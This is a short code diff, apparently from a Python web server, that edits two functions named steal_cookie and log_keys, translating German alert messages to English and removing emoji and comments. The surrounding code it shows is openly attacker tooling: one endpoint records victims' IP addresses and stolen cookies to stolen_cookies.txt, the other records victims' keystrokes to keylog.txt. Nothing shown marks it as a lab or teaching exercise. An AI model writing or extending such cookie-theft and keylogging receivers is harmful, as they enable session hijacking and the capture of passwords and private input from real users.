@@ -220,13 +220,12 @@ def steal_cookie():
     victim_ip = get_remote_address()
 
     print("\n" + "="*60)
-    print("🚨 COOKIE GESTOHLEN!")
+    print("COOKIE STOLEN")
     print("="*60)
     print(f"Victim IP: {victim_ip}")
     print(f"Cookie: {cookie}")
     print("="*60 + "\n")
 
-    # Optional: In Datei speichern
     with open("stolen_cookies.txt", "a") as f:
         f.write(f"[{victim_ip}] {cookie}\n")
 
@@ -239,9 +238,8 @@ def log_keys():
     victim_ip = get_remote_address()
 
     if keys:
-        print(f"\n⌨️  KEYLOG [{victim_ip}]: {keys}")
+        print(f"\nKEYLOG [{victim_ip}]: {keys}")
 
-        # Optional: In Datei speichern
         with open("keylog.txt", "a") as f:
             f.write(f"[{victim_ip}] {keys}\n")
 
